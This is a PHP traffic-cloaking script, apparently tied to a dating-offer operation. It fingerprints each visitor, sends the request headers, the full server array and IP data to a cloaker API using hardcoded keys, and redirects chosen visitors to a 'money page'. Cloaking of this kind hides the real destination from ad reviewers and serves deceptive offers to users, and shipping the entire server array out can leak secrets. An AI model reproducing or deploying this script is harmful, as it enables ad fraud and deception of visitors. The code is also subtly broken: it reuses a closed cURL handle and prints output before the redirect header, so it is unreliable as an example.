<?php

// Get the API URL from the .env file
// $apiUrl = 'https://cloaker.desired-dating.com/api/cloaker-stream/process-visitor';
$apiUrl = 'http://localhost:4000/api/cloaker-stream/process-visitor';



// $apiKey = '09e949e6-70c5-4fe3-bde2-b8b858a38bda';
$apiKey = 'a1c896d7-0660-4a0d-93f1-89aac4289633';
// $apiKey = 'd7eaeaa4-fc3e-4746-ab10-92421dab62c2';



// Initialize a cURL session
function callCurl($opts)
{
  if (!isset($opts["ch"])) {
    return;
  }

  $ch = $opts["ch"];

  // Set the URL to fetch
  curl_setopt($ch, CURLOPT_URL, $opts["url"]);


  if (isset($opts["body"])) {
    // Set the HTTP method to POST
    curl_setopt($ch, CURLOPT_POST, true);
    // Set the POST data
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($opts["body"]));
  } else {
    curl_setopt($ch, CURLOPT_HTTPGET, true);

  }

  // Return the transfer as a string instead of outputting directly
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);


  $headers = [];
  if (isset($opts["apiKey"])) {
    $headers = [
      'X-API-KEY: ' . $opts["apiKey"],
      'Content-Type: application/x-www-form-urlencoded'
    ];
  }
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

  // Execute the cURL session and get the response
  $response = curl_exec($ch);

  // Close the cURL session
  curl_close($ch);

  return $response;

}
// Function to get all request headers
function getRequestHeaders()
{
  if (function_exists('getallheaders')) {
    return getallheaders();
  } else {
    $headers = [];
    foreach ($_SERVER as $name => $value) {
      if (substr($name, 0, 5) == 'HTTP_') {
        $headers[str_replace(' ', '-', ucwords(str_replace('_', ' ', strtolower(substr($name, 5)))))] = $value;
      }
    }
    return $headers;
  }
}

// Get the user agent
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Get the IP address
$ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

// Generate a simple fingerprint (e.g., by hashing the user agent and IP address)
$fingerprint = md5($userAgent . $ipAddress);

$userAgentString = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$userAgent = [
  'browser' => get_browser_from_ua($userAgentString),
  'platform' => get_platform($userAgentString),
  'device' => get_device($userAgentString),
];

function get_browser_from_ua($userAgent)
{
  $browser = "Unknown";

  // Check if user agent contains Chrome
  if (preg_match('/Chrome/i', $userAgent)) {
    $browser = 'Chrome';
    preg_match('/Chrome\/([0-9.]+)/i', $userAgent, $matches);
    $version = isset($matches[1]) ? $matches[1] : '';
  }
  // Check if user agent contains Firefox
  elseif (preg_match('/Firefox/i', $userAgent)) {
    $browser = 'Firefox';
    preg_match('/Firefox\/([0-9.]+)/i', $userAgent, $matches);
    $version = isset($matches[1]) ? $matches[1] : '';
  }
  // Check if user agent contains Safari
  elseif (preg_match('/Safari/i', $userAgent)) {
    $browser = 'Safari';
    preg_match('/Version\/([0-9.]+)/i', $userAgent, $matches);
    $version = isset($matches[1]) ? $matches[1] : '';
  }
  // Check if user agent contains Edge
  elseif (preg_match('/Edg/i', $userAgent)) {
    $browser = 'Edge';
    preg_match('/Edg\/([0-9.]+)/i', $userAgent, $matches);
    $version = isset($matches[1]) ? $matches[1] : '';
  }
  // Check if user agent contains Internet Explorer
  elseif (preg_match('/MSIE/i', $userAgent) || preg_match('/Trident/i', $userAgent)) {
    $browser = 'Internet Explorer';
    preg_match('/(MSIE|rv:)\s?([0-9.]+)/i', $userAgent, $matches);
    $version = isset($matches[2]) ? $matches[2] : '';
  }
  // Check if user agent contains Opera
  elseif (preg_match('/Opera|OPR/i', $userAgent)) {
    $browser = 'Opera';
    preg_match('/(Opera|OPR)\/([0-9.]+)/i', $userAgent, $matches);
    $version = isset($matches[2]) ? $matches[2] : '';
  }

  // Return browser and version information
  return $browser;
}

// Function to get platform from user agent
function get_platform($userAgent)
{
  if (preg_match('/Windows|Win16|Win32|Win64|Windows NT/i', $userAgent)) {
    return 'Windows';
  } elseif (preg_match('/Macintosh|Mac OS X/i', $userAgent)) {
    return 'Macintosh';
  } elseif (preg_match('/Android/i', $userAgent)) {
    return 'Android';
  } elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) {
    return 'iOS';
  } elseif (preg_match('/Linux/i', $userAgent)) {
    return 'Linux';
  } elseif (preg_match('/Unix/i', $userAgent)) {
    return 'Unix';
  } else {
    return 'Unknown';
  }
}

// Function to get device type from user agent
function get_device($userAgent)
{
  if (preg_match('/iPad/i', $userAgent)) {
    return 'iPad';
  } elseif (preg_match('/iPhone/i', $userAgent)) {
    return 'iPhone';
  } elseif (preg_match('/Android/i', $userAgent)) {
    return 'Android Device';
  } elseif (preg_match('/Windows Phone|IEMobile/i', $userAgent)) {
    return 'Windows Phone';
  } elseif (preg_match('/Linux|BlackBerry|BB10/i', $userAgent)) {
    return 'Other Mobile';
  } else {
    return 'Desktop';
  }
}

function get_client_ip()
{
  $ipaddress = '';
  if (isset($_SERVER['HTTP_CLIENT_IP']))
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
  else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
  else if (isset($_SERVER['HTTP_X_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
  else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
  else if (isset($_SERVER['HTTP_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_FORWARDED'];
  else if (isset($_SERVER['REMOTE_ADDR']))
    $ipaddress = $_SERVER['REMOTE_ADDR'];
  else
    $ipaddress = 'UNKNOWN';

  return $ipaddress;
}

$requestHeader = getRequestHeaders();
$server = $_SERVER;
$ua = $userAgent;
$ip = get_client_ip();

$ch = curl_init();

$ipInfo = callCurl([
  "ch" => $ch,
  "url" => "https://ipinfo.io/" . $ip . "/json",
]);

// Data to be sent in the POST request
$postData = [
  'streamUUID' => '3e5b9bf4-f99c-45d0-8ac5-d3d8eefa3388',
  // 'streamId' => '7631dac6-7b28-4a94-a55b-881c577570f8',
  'requestHeaders' => $requestHeader,
  'server' => $server,
  'ua' => $ua,
  'ip' => $ip,
  'ipInfo' => json_decode($ipInfo)
];


$response = callCurl([
  "ch" => $ch,
  "url" => $apiUrl,
  "body" => $postData,
  "apiKey" => $apiKey
]);
echo '<pre>';
echo json_encode($postData, JSON_PRETTY_PRINT);
echo '</pre>';

// Check for cURL errors
if ($response === false) {
  $error = curl_error($ch);
  echo "cURL Error: $error";
} else {
  // Decode the JSON response (if applicable)
  $data = json_decode($response, true);
  // Handle the API response
  if ($data['stream']['moneyPage']) {
    if ($data["action"] == "redirect-money") {
      header('Location: ' . $data['stream']['moneyPage']);
    }
  }
}